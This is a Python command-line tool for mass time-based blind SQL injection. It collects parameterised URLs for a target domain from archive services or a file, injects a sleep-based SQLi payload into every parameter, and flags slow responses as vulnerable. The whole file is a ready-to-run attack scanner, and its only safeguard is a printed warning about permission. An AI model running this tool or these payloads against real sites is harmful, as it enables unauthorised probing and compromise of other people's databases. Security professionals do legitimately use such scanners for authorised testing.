import requests
import subprocess
import urllib.parse
import time
import re
from typing import List, Set
import warnings
import argparse
import os
import sys

# Suppress warnings for unverified HTTPS requests (optional, for testing)
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

def gather_urls(domain: str, verbose: bool = False) -> Set[str]:
    """
    Gather URLs using gau, waybackurls, and simulated Google Dorking.
    Returns a set of unique URLs with parameters.
    """
    urls = set()
    
    if verbose:
        print(f"[*] Running gau and waybackurls for domain: {domain}")
    
    try:
        # Run gau
        gau_process = subprocess.run(['gau', domain], capture_output=True, text=True)
        gau_urls = gau_process.stdout.splitlines()
        urls.update(gau_urls)
        if verbose:
            print(f"[*] Found {len(gau_urls)} URLs from gau")
        
        # Run waybackurls
        wayback_process = subprocess.run(['waybackurls', domain], capture_output=True, text=True)
        wayback_urls = wayback_process.stdout.splitlines()
        urls.update(wayback_urls)
        if verbose:
            print(f"[*] Found {len(wayback_urls)} URLs from waybackurls")
        
        # Simulated Google Dorking (placeholder)
        dork_urls = []  # Replace with actual dorking logic if needed
        urls.update(dork_urls)
        if verbose:
            print(f"[*] Found {len(dork_urls)} URLs from Google Dorking")
        
        # Filter URLs to include only those with parameters
        param_urls = {url.strip() for url in urls if '?' in url}
        return param_urls
    except Exception as e:
        print(f"[!] Error gathering URLs: {e}")
        return set()

def read_urls_from_file(file_path: str, verbose: bool = False) -> Set[str]:
    """
    Read URLs from a provided file and validate them.
    Returns a set of unique, valid URLs with parameters.
    """
    urls = set()
    url_pattern = re.compile(r'^https?://[^\s<>"]+\?[^=]+=.*$')  # Basic URL with params validation
    
    try:
        if not os.path.exists(file_path):
            print(f"[!] File {file_path} does not exist.")
            return urls
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url and url_pattern.match(url):
                    urls.add(url)
                elif verbose and url:
                    print(f"[!] Skipping invalid URL or URL without parameters: {url}")
        if verbose:
            print(f"[*] Loaded {len(urls)} valid URLs with parameters from {file_path}")
        return urls
    except Exception as e:
        print(f"[!] Error reading file {file_path}: {e}")
        return set()

def parse_url_params(url: str) -> List[tuple]:
    """
    Parse URL to extract parameters and their values.
    Returns a list of (param_name, param_value) tuples.
    """
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qsl(parsed_url.query)
    return query_params

def inject_sqli_payload(url: str, param: str, payload: str) -> str:
    """
    Inject SQLi payload into a specific parameter of the URL.
    Returns the modified URL with the payload.
    """
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
    
    # Inject payload into the specified parameter
    query_params[param] = [payload]
    
    # Reconstruct the query string
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    new_url = urllib.parse.urlunparse((
        parsed_url.scheme,
        parsed_url.netloc,
        parsed_url.path,
        parsed_url.params,
        new_query,
        parsed_url.fragment
    ))
    return new_url

def analyze_response(url: str, timeout_threshold: float = 10.0, verbose: bool = False) -> bool:
    """
    Send request to the URL and measure response time to detect time-based SQLi.
    Returns True if the response time exceeds the threshold, indicating potential vulnerability.
    """
    start_time = time.time()
    try:
        response = requests.get(url, timeout=15, verify=False)
        elapsed_time = time.time() - start_time
        if verbose:
            print(f"[*] URL: {url}, Response Time: {elapsed_time:.2f}s, Status: {response.status_code}")
        return elapsed_time >= timeout_threshold
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"[!] Error accessing {url}: {e}")
        return False

def save_results(output_file: str, url: str, param: str):
    """
    Save potentially vulnerable URLs and parameters to the output file.
    """
    try:
        with open(output_file, 'a') as f:
            f.write(f"Vulnerable URL: {url}, Parameter: {param}\n")
    except Exception as e:
        print(f"[!] Error writing to output file {output_file}: {e}")

def main(domain: str, url_file: str = None, output_file: str = None, verbose: bool = False, 
         payload: str = "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"):
    """
    Main function to run the Blind SQLi tool.
    """
    print("[!] WARNING: Only use this tool on systems you have explicit permission to test.")
    print("[!] Unauthorized testing is illegal and unethical.")
    
    urls = set()
    
    # Gather URLs from gau, waybackurls, and Google Dorking if domain is provided
    if domain:
        if verbose:
            print(f"[*] Gathering URLs for domain: {domain}")
        urls.update(gather_urls(domain, verbose))
    
    # Read URLs from file if provided
    if url_file:
        if verbose:
            print(f"[*] Reading URLs from file: {url_file}")
        urls.update(read_urls_from_file(url_file, verbose))
    
    if not urls:
        print("[!] No URLs with parameters found.")
        return
    
    print(f"[*] Found {len(urls)} URLs with parameters.")
    
    for url in urls:
        print(f"\n[*] Testing URL: {url}")
        params = parse_url_params(url)
        if not params:
            if verbose:
                print("[!] No parameters found in URL.")
            continue
        
        for param_name, _ in params:
            if verbose:
                print(f"[*] Injecting payload into parameter: {param_name}")
            injected_url = inject_sqli_payload(url, param_name, payload)
            if verbose:
                print(f"[*] Testing injected URL: {injected_url}")
            
            # Test the injected URL and measure response time
            if analyze_response(injected_url, verbose=verbose):
                print(f"[!] Potential SQLi vulnerability detected in parameter '{param_name}' of URL: {url}")
                if output_file:
                    save_results(output_file, url, param_name)
            else:
                print(f"[*] No vulnerability detected in parameter '{param_name}'.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Blind SQL Injection Tool")
    parser.add_argument("domain", nargs="?", default="", help="Target domain to gather URLs from (e.g., example.com)")
    parser.add_argument("-f", "--file", help="File containing URLs to test")
    parser.add_argument("-o", "--output", help="File to save results of potentially vulnerable URLs")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()
    
    if not args.domain and not args.file:
        print("[!] Error: At least one of domain or URL file must be provided.")
        print("Usage: python3 bsqli.py <domain> [-f <url_file>] [-o <output_file>] [-v]")
        sys.exit(1)
    
    main(args.domain, args.file, args.output, args.verbose)
